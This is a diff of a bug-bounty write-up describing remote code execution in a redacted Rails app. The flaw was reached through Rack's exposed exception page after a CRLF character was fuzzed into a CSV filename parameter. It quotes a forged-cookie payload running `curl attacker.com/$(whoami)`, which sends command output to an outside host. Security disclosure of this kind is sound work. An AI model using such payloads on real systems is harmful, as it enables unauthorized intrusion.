@@ -68,13 +68,13 @@ page going offline. To read the original, follow the link above.
 
 So a few days back i started testing a private BB program, I found a straightforward RCE on it. I choose'd to start hunting on the main web app i.e. [https://app.redacted.com](https://www.google.com/url?q=https%3A%2F%2Fapp.redacted.com&sa=D&sntz=1&usg=AFQjCNEErylzOjf43Tf3B6PY7c1cbL8WwQ), While going through i found an endpoint which downloads a CSV report via [redacted.redacted.com](https://www.google.com/url?q=https%3A%2F%2Fredacted.redacted.com&sa=D&sntz=1&usg=AFQjCNHswvEsikfMc3D4rA-J69wm3X_fwQ) (In-scope asset). The filename and its content was defined in the request it self.
 
-![](https://blog.harshjaiswal.com/content/images/2019/07/unnamed--2-.png)
+!
 
 ## Something happened
 
 I was fuzzing around parameters, When i passed %0D to file_name the server threw an exception, The exception thrown because [Rack's ShowExceptions](https://www.google.com/url?q=https%3A%2F%2Fwww.rubydoc.info%2Fgems%2Frack%2FRack%2FShowExceptions&sa=D&sntz=1&usg=AFQjCNEGpoRNMZk6DP-ZqxaPFM_lVqHdbA) was on.
 
-![](https://blog.harshjaiswal.com/content/images/2019/07/unnamed--3-.png)
+!
 
 ## It's more than something
 
@@ -82,7 +82,7 @@ As the the Rack's page suggests, "Be careful when you use this on public-facing 
 
 I quickly used the above code to generate a cookie to execute `curl attacker.com/$(whoami)` and got an request to attacker.com/app.
 
-![](https://blog.harshjaiswal.com/content/images/2019/07/unnamed--4-.png)
+!
 
 This RCE was applicable for both [https://app.redacted.com/](https://www.google.com/url?q=https%3A%2F%2Fapp.redacted.com%2F&sa=D&sntz=1&usg=AFQjCNGLXLg3s2xgWWVO9bPOBzs4JzhEog) and [https://redacted.redacted.com/](https://www.google.com/url?q=https%3A%2F%2Fredacted.redacted.com%2F&sa=D&sntz=1&usg=AFQjCNG92fNi_ktAHZEPGXwdIOaIn6sAVA) because both shared same rails app.
 
